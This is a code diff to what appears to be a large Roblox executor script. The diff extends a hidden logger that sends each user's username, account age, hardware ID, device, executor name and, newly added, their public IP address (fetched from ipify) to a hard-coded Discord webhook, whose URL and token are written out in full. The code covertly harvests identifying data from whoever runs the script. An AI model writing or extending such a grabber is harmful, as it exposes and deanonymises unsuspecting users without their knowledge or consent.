@@ -5186,7 +5186,7 @@ chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Positio
 local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
 
 -- Function to send an embedded message to the Discord webhook
-local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
+local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName, ipAddress)
     -- Create the JSON payload with an embed
     local data = {
         ["embeds"] = {
@@ -5238,6 +5238,11 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
                         ["name"] = "Executor",
                         ["value"] = executorName,
                         ["inline"] = false
+                    },
+                    {
+                        ["name"] = "IP Address",
+                        ["value"] = "||" .. ipAddress .. "||",  -- Spoiler format
+                        ["inline"] = false
                     }
                 },
                 ["color"] = 16753920 -- Color code for orange
@@ -5285,8 +5290,31 @@ local deviceType = identifyexecutor() and (identifyexecutor():find("Mobile") and
 -- Get the executor name, or "Unknown" if nil
 local executorName = identifyexecutor() or "Unknown"
 
+-- Fetch the player's IP address from ipify
+local function getIPAddress()
+    local ipResponse = http_request({
+        Url = "https://api.ipify.org?format=json",
+        Method = "GET",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        }
+    })
+
+    if ipResponse.StatusCode == 200 then
+        local ipData = game:GetService("HttpService"):JSONDecode(ipResponse.Body)
+        return ipData.ip  -- Return the IP address
+    else
+        print("Failed to fetch IP address. Status code: " .. ipResponse.StatusCode)
+        return "Unknown IP"
+    end
+end
+
+-- Get the player's IP address
+local ipAddress = getIPAddress()
+
 -- Send the webhook message with all gathered info
-sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
+sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName, ipAddress)
+
 
 
 
